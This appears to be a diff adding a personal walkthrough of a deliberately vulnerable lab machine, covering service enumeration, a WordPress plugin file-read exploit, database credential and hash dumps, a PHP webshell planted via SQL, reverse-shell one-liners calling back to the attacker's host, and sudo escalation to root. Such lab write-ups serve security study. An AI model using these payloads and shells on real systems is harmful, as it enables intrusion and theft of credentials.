@@ -1,0 +1,478 @@
+###################################################################################################################################################################################################################
+[ 1 ] ENUMERATION
+
+// OS & Services
+PORT      STATE  SERVICE     VERSION
+20/tcp    closed ftp-data
+21/tcp    open   ftp         vsftpd 2.0.8 or later
+22/tcp    open   ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+53/tcp    open   domain      dnsmasq 2.75
+80/tcp    open   http        PHP cli server 5.5 or later
+123/tcp   closed ntp
+137/tcp   closed netbios-ns
+138/tcp   closed netbios-dgm
+139/tcp   open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+666/tcp   open   doom?
+3306/tcp  open   mysql       MySQL 5.7.12-0ubuntu1
+12380/tcp open   http        Apache httpd 2.4.18 ((Ubuntu))
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port666-TCP:V=7.50%I=7%D=7/3%Time=595A839F%P=x86_64-unknown-linux-gnu%r
+SF:(NULL,2D58,"PK\x03\x04\x14\0\x02\0\x08\0d\x80\xc3Hp\xdf\x15\x81\xaa,\0\
+SF:0\x152\0\0\x0c\0\x1c\0message2\.jpgUT\t\0\x03\+\x9cQWJ\x9cQWux\x0b\0\x0
+SF:1\x04\xf5\x01\0\0\x04\x14\0\0\0\xadz\x0bT\x13\xe7\xbe\xefP\x94\x88\x88A
+SF:@\xa2\x20\x19\xabUT\xc4T\x11\xa9\x102>\x8a\xd4RDK\x15\x85Jj\xa9\"DL\[E\
+SF:xa2\x0c\x19\x140<\xc4\xb4\xb5\xca\xaen\x89\x8a\x8aV\x11\x91W\xc5H\x20\x
+SF:0f\xb2\xf7\xb6\x88\n\x82@%\x99d\xb7\xc8#;3\[\r_\xcddr\x87\xbd\xcf9\xf7\
+SF:xaeu\xeeY\xeb\xdc\xb3oX\xacY\xf92\xf3e\xfe\xdf\xff\xff\xff=2\x9f\xf3\x9
+SF:9\xd3\x08y}\xb8a\xe3\x06\xc8\xc5\x05\x82>`\xfe\x20\xa7\x05:\xb4y\xaf\xf
+SF:8\xa0\xf8\xc0\^\xf1\x97sC\x97\xbd\x0b\xbd\xb7nc\xdc\xa4I\xd0\xc4\+j\xce
+SF:\[\x87\xa0\xe5\x1b\xf7\xcc=,\xce\x9a\xbb\xeb\xeb\xdds\xbf\xde\xbd\xeb\x
+SF:8b\xf4\xfdis\x0f\xeeM\?\xb0\xf4\x1f\xa3\xcceY\xfb\xbe\x98\x9b\xb6\xfb\x
+SF:e0\xdc\]sS\xc5bQ\xfa\xee\xb7\xe7\xbc\x05AoA\x93\xfe9\xd3\x82\x7f\xcc\xe
+SF:4\xd5\x1dx\xa2O\x0e\xdd\x994\x9c\xe7\xfe\x871\xb0N\xea\x1c\x80\xd63w\xf
+SF:1\xaf\xbd&&q\xf9\x97'i\x85fL\x81\xe2\\\xf6\xb9\xba\xcc\x80\xde\x9a\xe1\
+SF:xe2:\xc3\xc5\xa9\x85`\x08r\x99\xfc\xcf\x13\xa0\x7f{\xb9\xbc\xe5:i\xb2\x
+SF:1bk\x8a\xfbT\x0f\xe6\x84\x06/\xe8-\x17W\xd7\xb7&\xb9N\x9e<\xb1\\\.\xb9\
+SF:xcc\xe7\xd0\xa4\x19\x93\xbd\xdf\^\xbe\xd6\xcdg\xcb\.\xd6\xbc\xaf\|W\x1c
+SF:\xfd\xf6\xe2\x94\xf9\xebj\xdbf~\xfc\x98x'\xf4\xf3\xaf\x8f\xb9O\xf5\xe3\
+SF:xcc\x9a\xed\xbf`a\xd0\xa2\xc5KV\x86\xad\n\x7fou\xc4\xfa\xf7\xa37\xc4\|\
+SF:xb0\xf1\xc3\x84O\xb6nK\xdc\xbe#\)\xf5\x8b\xdd{\xd2\xf6\xa6g\x1c8\x98u\(
+SF:\[r\xf8H~A\xe1qYQq\xc9w\xa7\xbe\?}\xa6\xfc\x0f\?\x9c\xbdTy\xf9\xca\xd5\
+SF:xaak\xd7\x7f\xbcSW\xdf\xd0\xd8\xf4\xd3\xddf\xb5F\xabk\xd7\xff\xe9\xcf\x
+SF:7fy\xd2\xd5\xfd\xb4\xa7\xf7Y_\?n2\xff\xf5\xd7\xdf\x86\^\x0c\x8f\x90\x7f
+SF:\x7f\xf9\xea\xb5m\x1c\xfc\xfef\"\.\x17\xc8\xf5\?B\xff\xbf\xc6\xc5,\x82\
+SF:xcb\[\x93&\xb9NbM\xc4\xe5\xf2V\xf6\xc4\t3&M~{\xb9\x9b\xf7\xda-\xac\]_\x
+SF:f9\xcc\[qt\x8a\xef\xbao/\xd6\xb6\xb9\xcf\x0f\xfd\x98\x98\xf9\xf9\xd7\x8
+SF:f\xa7\xfa\xbd\xb3\x12_@N\x84\xf6\x8f\xc8\xfe{\x81\x1d\xfb\x1fE\xf6\x1f\
+SF:x81\xfd\xef\xb8\xfa\xa1i\xae\.L\xf2\\g@\x08D\xbb\xbfp\xb5\xd4\xf4Ym\x0b
+SF:I\x96\x1e\xcb\x879-a\)T\x02\xc8\$\x14k\x08\xae\xfcZ\x90\xe6E\xcb<C\xcap
+SF:\x8f\xd0\x8f\x9fu\x01\x8dvT\xf0'\x9b\xe4ST%\x9f5\x95\xab\rSWb\xecN\xfb&
+SF:\xf4\xed\xe3v\x13O\xb73A#\xf0,\xd5\xc2\^\xe8\xfc\xc0\xa7\xaf\xab4\xcfC\
+SF:xcd\x88\x8e}\xac\x15\xf6~\xc4R\x8e`wT\x96\xa8KT\x1cam\xdb\x99f\xfb\n\xb
+SF:c\xbcL}AJ\xe5H\x912\x88\(O\0k\xc9\xa9\x1a\x93\xb8\x84\x8fdN\xbf\x17\xf5
+SF:\xf0\.npy\.9\x04\xcf\x14\x1d\x89Rr9\xe4\xd2\xae\x91#\xfbOg\xed\xf6\x15\
+SF:x04\xf6~\xf1\]V\xdcBGu\xeb\xaa=\x8e\xef\xa4HU\x1e\x8f\x9f\x9bI\xf4\xb6G
+SF:TQ\xf3\xe9\xe5\x8e\x0b\x14L\xb2\xda\x92\x12\xf3\x95\xa2\x1c\xb3\x13\*P\
+SF:x11\?\xfb\xf3\xda\xcaDfv\x89`\xa9\xe4k\xc4S\x0e\xd6P0");
+Service Info: Host: RED; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 99.54 seconds
+
+// Service listening on port 21 FTP
+vsftpd 2.0.8 or later
+https://www.exploit-db.com/exploits/17491/
+exploit/unix/ftp/vsftpd_234_backdoor
+// It doesnt work
+[*] Exploit completed, but no session was created.
+
+// I try anonymous login and it works
+ftp 192.168.1.16
+anonymous/anonymous
+// another user
+220-|-----------------------------------------------------------------------------------------|
+220-| Harry, make sure to update the banner when you get a chance to show who has access here |
+220-|-----------------------------------------------------------------------------------------|
+
+
+// I find a text file
+cat note
+Elly, make sure you update the payload information. Leave it in your FTP account once your are done, John."
+// So we know 2 users, Elly and John
+
+// Trying to brute force Elly ftp account
+hydra -l Elly -P /home/USER/Zap/john.txt 192.168.1.16 ftp
+
+// Bruteforce 3 account's Barry, Elly and John
+// 0 passwords found
+
+
+
+
+// Service listening on port 22 SSH
+22/tcp    open   ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+https://www.exploit-db.com/exploits/40136/
+
+// We see 1 possible user name in the banner
+-----------------------------------------------------------------
+~          Barry, don't forget to put a message here           ~
+-----------------------------------------------------------------
+
+// We try anonymous login
+// It doesnt' work
+
+// Bruteforce 3 account's Barry, Elly and John
+// 0 passwords found
+
+// Service listening on port 53 DNSMASQ
+dnsmasq 2.75
+// I ask this server for his own information
+dig localhost ANY @192.168.1.16
+
+; <<>> DiG 9.11.1-P1 <<>> localhost ANY @192.168.1.16
+;; global options: +cmd
+;; Got answer:
+;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 26525
+;; flags: qr aa rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 1
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 1280
+;; QUESTION SECTION:
+;localhost.			IN	ANY
+
+;; ANSWER SECTION:
+localhost.		0	IN	A	127.0.0.1
+localhost.		0	IN	AAAA	::1
+
+;; Query time: 0 msec
+;; SERVER: 192.168.1.16#53(192.168.1.16)
+;; WHEN: lun jul 03 21:00:02 CEST 2017
+;; MSG SIZE  rcvd: 82
+
+
+// Web server on port 80
+// I run Nikto
++ OSVDB-3093: /.bashrc: User home dir was found with a shell rc file. This may reveal file and path information.
++ OSVDB-3093: /.profile: User home dir with a shell profile was found. May reveal directory information and system configuration.
+// I download both files
+//Username or hostname?
+debian_chroot
+
+
+// Service 139
+// Try to empty login with rpcclient
+rpcclient -U "" 192.168.1.16
+// It works
+// I cant get useful info, i tried command
+enumdomusers
+// found Samba version
+[+] Got OS info for 192.168.1.16 from smbclient: Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.9-Ubuntu]
+// Found shared folders
+	print$          Disk      Printer Drivers
+	kathy           Disk      Fred, What are we doing here?
+	tmp             Disk      All temporary files should be stored here
+	IPC$            IPC       IPC Service (red server (Samba, Ubuntu))
+-----
+//192.168.1.16/kathy	Mapping: OK, Listing: OK
+//192.168.1.16/tmp	Mapping: OK, Listing: OK
+//192.168.1.16/IPC$	Mapping: OK	Listing: DENIED
+
+// I use smbclient with option -N (No pass)
+root@revival:~# smbclient -N -L 192.168.1.16
+WARNING: The "syslog" option is deprecated
+Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.9-Ubuntu]
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	print$          Disk      Printer Drivers
+	kathy           Disk      Fred, What are we doing here?
+	tmp             Disk      All temporary files should be stored here
+	IPC$            IPC       IPC Service (red server (Samba, Ubuntu))
+Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.9-Ubuntu]
+
+	Server               Comment
+	---------            -------
+	RED                  red server (Samba, Ubuntu)
+
+	Workgroup            Master
+	---------            -------
+	WORKGROUP            RED
+
+// Found 2 more users kathy and Fred
+
+
+
+
+// Service MySQL 3306
+mysql -u root -p -h 192.168.1.16
+Enter password: 
+ERROR 1045 (28000): Access denied for user 'root'@'192.168.1.55' (using password: NO)
+
+
+// Service Unknown 666
+Download a binary
+string,elf2
+//strings, nm, ltrace, strace, LD_PRELOAD
+
+
+// Here is another web server on port 12380
+Server: Apache/2.4.18 (Ubuntu)
++ Uncommon header 'dave' found, with contents: Soemthing doesn't look right here
++ Entry '/admin112233/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ Entry '/blogblog/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ "robots.txt" contains 2 entries which should be manually viewed.
++ Uncommon header 'x-ob_mode' found, with contents: 1
++ OSVDB-3233: /icons/README: Apache default file found.
+/phpmyadmin/: phpMyAdmin directory found
+
+
+// Webpage made with a CMS
+CMS Creative Tim
+
+// I look for the directories i've found
+// You must enter with https
+
+// Dead end...
+https://192.168.1.15:12380/admin112233
+
+// Wordpress
+https://192.168.1.15:12380/blogblog/
+
+// I use wpscan
+wpscan --url https://192.168.1.15:12380/blogblog/ --enumerate p --disable-tls-checks
+//It shows a lot of information
+
+// user list
+wpscan -u https://vm:12380/blogblog/ --enumerate u
+
+// I run sqlmap
+// It seems not vulnerable
+
+// I run wfuzz in this directory
+wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/big.txt --hc 404 https://192.168.1.15:12380/blogblog/FUZZ
+
+// In source code of the webpage i found:
+WordPress 4.2.1
+
+// It has multiple vulnerabilites
+// These are interesting:
+[!] Title: WordPress 3.5-4.7.1 - WP_Query SQL Injection
+    Reference: https://wpvulndb.com/vulnerabilities/8730
+    Reference: https://wordpress.org/news/2017/01/wordpress-4-7-2-security-release/
+    Reference: https://github.com/WordPress/WordPress/commit/85384297a60900004e27e417eac56d24267054cb
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5611
+[i] Fixed in: 4.2.12
+
+//Plugins
+[+] We found 2 plugins:
+
+[+] Name: akismet
+ |  Latest version: 3.3.2 
+ |  Location: https://192.168.1.15:12380/blogblog/wp-content/plugins/akismet/
+
+[!] We could not determine a version so all vulnerabilities are printed out
+
+[!] Title: Akismet 2.5.0-3.1.4 - Unauthenticated Stored Cross-Site Scripting (XSS)
+    Reference: https://wpvulndb.com/vulnerabilities/8215
+    Reference: http://blog.akismet.com/2015/10/13/akismet-3-1-5-wordpress/
+    Reference: https://blog.sucuri.net/2015/10/security-advisory-stored-xss-in-akismet-wordpress-plugin.html
+[i] Fixed in: 3.1.5
+
+[+] Name: shortcode-ui - v0.6.2
+ |  Location: https://192.168.1.15:12380/blogblog/wp-content/plugins/shortcode-ui/
+ |  Readme: https://192.168.1.15:12380/blogblog/wp-content/plugins/shortcode-ui/readme.txt
+[!] The version is out of date, the latest version is 0.7.2
+[!] Directory listing is enabled: https://192.168.1.15:12380/blogblog/wp-content/plugins/shortcode-ui/
+
+
+// I can access to wp-content
+https://192.168.1.15:12380/blogblog/wp-content/
+
+// I manually look for the plugins:
+https://192.168.1.15:12380/blogblog/wp-content/plugins/
+
+!!!!!
+// I found this exploit for a installed plugin
+https://www.exploit-db.com/exploits/39646/
+
+
+###################################################################################################################################################################################################################
+[ 2 ] EXPLOTATION
+
+2.1 Wordpress plugin Advanced Video 1.0
+https://www.exploit-db.com/exploits/39646/
+
+// I download it, but it doesn't work because of a SSL problem
+// I fix it
+cat exploit.py 
+import random
+import urllib2
+import re
+import ssl
+
+ctx = ssl.create_default_context()
+ctx.check_hostname = False
+ctx.verify_mode = ssl.CERT_NONE
+
+#url = "http://127.0.0.1/wordpress" # insert url to wordpress
+url = "https://192.168.1.15:12380/blogblog/"
+
+randomID = long(random.random() * 100000000000000000L)
+ 
+objHtml = urllib2.urlopen(url + '/wp-admin/admin-ajax.php?action=ave_publishPost&title=' + str(randomID) + '&short=rnd&term=rnd&thumb=../wp-config.php', context=ctx)
+content =  objHtml.readlines()
+for line in content:
+    print (content)
+    numbers = re.findall(r'\d+',line)
+    id = numbers[-1]
+    id = int(id) / 10
+ 
+objHtml = urllib2.urlopen(url + '/?p=' + str(id), context=ctx)
+content = objHtml.readlines()
+ 
+for line in content:
+    if 'attachment-post-thumbnail size-post-thumbnail wp-post-image' in line:
+        urls=re.findall('"(https?://.*?)"', line)
+        print urllib2.urlopen(urls[0]).read()
+
+
+// I use it and it generates a new post with an "image" on the blog
+// I download the image
+wget https://192.168.1.15:12380/blogblog/wp-content/uploads/151856898.jpeg --no-check-certificate
+// I read the file
+// ** MySQL settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define('DB_NAME', 'wordpress');
+
+/** MySQL database username */
+define('DB_USER', 'root');
+
+/** MySQL database password */
+define('DB_PASSWORD', 'plbkac');
+
+/** MySQL hostname */
+define('DB_HOST', 'localhost');
+
+/** Database Charset to use in creating database tables. */
+define('DB_CHARSET', 'utf8mb4');
+
+//I connect to mysql server
+root@revival:~# mysql -u root -p -h 192.168.1.15
+
+use mysql;
+show tables;
+select * from user;
+root *9B2DDC0D01126C483D173FB2A0ED14FFEC2B45AA 
+mysql.sys *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
+debian-sys-maint *DA79B10C207695571B8B72309996531AC6504291
+phpmyadmin *5153994ADAD440E919F0FD79B30131EB30A54CBB
+root *9B2DDC0D01126C483D173FB2A0ED14FFEC2B45AA
+
+
+mysql> select * from staff_list;
++----+--------------+----------------------+----------+-------------+------------+-----------+-----+
+| ID | name         | address              | zip code | phone       | city       | country   | SID |
++----+--------------+----------------------+----------+-------------+------------+-----------+-----+
+|  1 | Mike Hillyer | 23 Workhaven Lane    |          | 14033335568 | Lethbridge | Canada    |   1 |
+|  2 | Jon Stephens | 1411 Lillydale Drive |          | 6172235589  | Woodridge  | Australia |   2 |
++----+--------------+----------------------+----------+-------------+------------+-----------+-----+
+
+// I found a message:
+mysql> select * from message;
++--------------------------------------------------------------------------+
+| text                                                                     |
++--------------------------------------------------------------------------+
+| Vicki, You really need to sort out this database when you get the chance |
++--------------------------------------------------------------------------+
+1 row in set (0.05 sec)
+
+// I found wordpress logins and passwords
+mysql> select * from wp_users;
++----+------------+------------------------------------+---------------+-----------------------+------------------+---------------------+---------------------+-------------+-----------------+
+| ID | user_login | user_pass                          | user_nicename | user_email            | user_url         | user_registered     | user_activation_key | user_status | display_name    |
++----+------------+------------------------------------+---------------+-----------------------+------------------+---------------------+---------------------+-------------+-----------------+
+|  1 | John       | $P$B7889EMq/erHIuZapMB8GEizebcIy9. | john          | john@red.localhost    | http://localhost | 2016-06-03 23:18:47 |                     |           0 | John Smith      |
+|  2 | Elly       | $P$BlumbJRRBit7y50Y17.UPJ/xEgv4my0 | elly          | Elly@red.localhost    |                  | 2016-06-05 16:11:33 |                     |           0 | Elly Jones      |
+|  3 | Peter      | $P$BTzoYuAFiBA5ixX2njL0XcLzu67sGD0 | peter         | peter@red.localhost   |                  | 2016-06-05 16:13:16 |                     |           0 | Peter Parker    |
+|  4 | barry      | $P$BIp1ND3G70AnRAkRY41vpVypsTfZhk0 | barry         | barry@red.localhost   |                  | 2016-06-05 16:14:26 |                     |           0 | Barry Atkins    |
+|  5 | heather    | $P$Bwd0VpK8hX4aN.rZ14WDdhEIGeJgf10 | heather       | heather@red.localhost |                  | 2016-06-05 16:18:04 |                     |           0 | Heather Neville |
+|  6 | garry      | $P$BzjfKAHd6N4cHKiugLX.4aLes8PxnZ1 | garry         | garry@red.localhost   |                  | 2016-06-05 16:18:23 |                     |           0 | garry           |
+|  7 | harry      | $P$BqV.SQ6OtKhVV7k7h1wqESkMh41buR0 | harry         | harry@red.localhost   |                  | 2016-06-05 16:18:41 |                     |           0 | harry           |
+|  8 | scott      | $P$BFmSPiDX1fChKRsytp1yp8Jo7RdHeI1 | scott         | scott@red.localhost   |                  | 2016-06-05 16:18:59 |                     |           0 | scott           |
+|  9 | kathy      | $P$BZlxAMnC6ON.PYaurLGrhfBi6TjtcA0 | kathy         | kathy@red.localhost   |                  | 2016-06-05 16:19:14 |                     |           0 | kathy           |
+| 10 | tim        | $P$BXDR7dLIJczwfuExJdpQqRsNf.9ueN0 | tim           | tim@red.localhost     |                  | 2016-06-05 16:19:29 |                     |           0 | tim             |
+| 11 | ZOE        | $P$B.gMMKRP11QOdT5m1s9mstAUEDjagu1 | zoe           | zoe@red.localhost     |                  | 2016-06-05 16:19:50 |                     |           0 | ZOE             |
+| 12 | Dave       | $P$Bl7/V9Lqvu37jJT.6t4KWmY.v907Hy. | dave          | dave@red.localhost    |                  | 2016-06-05 16:20:09 |                     |           0 | Dave            |
+| 13 | Simon      | $P$BLxdiNNRP008kOQ.jE44CjSK/7tEcz0 | simon         | simon@red.localhost   |                  | 2016-06-05 16:20:35 |                     |           0 | Simon           |
+| 14 | Abby       | $P$ByZg5mTBpKiLZ5KxhhRe/uqR.48ofs. | abby          | abby@red.localhost    |                  | 2016-06-05 16:20:53 |                     |           0 | Abby            |
+| 15 | Vicki      | $P$B85lqQ1Wwl2SqcPOuKDvxaSwodTY131 | vicki         | vicki@red.localhost   |                  | 2016-06-05 16:21:14 |                     |           0 | Vicki           |
+| 16 | Pam        | $P$BuLagypsIJdEuzMkf20XyS5bRm00dQ0 | pam           | pam@red.localhost     |                  | 2016-06-05 16:42:23 |                     |           0 | Pam             |
++----+------------+------------------------------------+---------------+-----------------------+------------------+---------------------+---------------------+-------------+-----------------+
+
+// Now, i upload a webshell
+select "<?php passthru($_GET['x']); ?>" into outfile '/var/www/https/blogblog/wp-content/uploads/shell.php';
+
+// I try to start a connection but it doesnt' work
+nc -nlvp 8088
+// It doesn't work
+nc -e /bin/bash 192.168.1.8 8088
+// It doesn't work
+bash -i >& /dev/tcp/192.168.1.8/8088 0>&1
+// It works
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.8",8088));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+// interactive shell
+python -c 'import pty;pty.spawn("/bin/bash")'
+
+www-data@red:/var/www/https/blogblog/wp-content/uploads$ whoami
+whoami
+www-data
+www-data@red:/var/www/https/blogblog/wp-content/uploads$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+###################################################################################################################################################################################################################
+[ 3 ] PRIVILEGE ESCALATION
+
+// in peter profile
+/home/peter/.sudo_as_admin_successful
+
+// in Jkanode profile
+www-data@red:/home/JKanode$ cat .bash_history
+cat .bash_history
+id
+whoami
+ls -lah
+pwd
+ps aux
+sshpass -p thisimypassword ssh JKanode@localhost
+apt-get install sshpass
+sshpass -p JZQuyIN5 peter@localhost
+ps -ef
+top
+kill -9 3747
+exit
+
+// SSH USER
+sshpass -p JZQuyIN5 peter@localhost
+sshpass -p thisimypassword ssh JKanode@localhost
+
+// Peter has more privileges
+uid=1000(peter) gid=1000(peter) groups=1000(peter),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
+
+// I connect by SSH with peter user
+This is the Z Shell configuration function for new users,
+zsh-newuser-install.
+You are seeing this message because you have no zsh startup files
+(the files .zshenv, .zprofile, .zshrc, .zlogin in the directory
+~).  This function can help you with a few settings that should
+make your use of the shell easier.
+
+You can:
+
+(q)  Quit and do nothing.  The function will be run again next time.
+
+(0)  Exit, creating the file ~/.zshrc containing just a comment.
+     That will prevent this function being run again.
+
+(1)  Continue to the main menu.
+
+(2)  Populate your ~/.zshrc with the configuration recommended
+     by the system administrator and exit (you will need to edit
+     the file by hand, if so desired).
+
+--- Type one of the keys in parentheses --- 
+
+/bin/bash
+
+peter@red:~$ sudo su
+➜  peter id
+uid=0(root) gid=0(root) groups=0(root)
+
+//Exploit 39772
+
+
+###################################################################################################################################################################################################################
+[ + ] INFORMATION
+
+
+###################################################################################################################################################################################################################
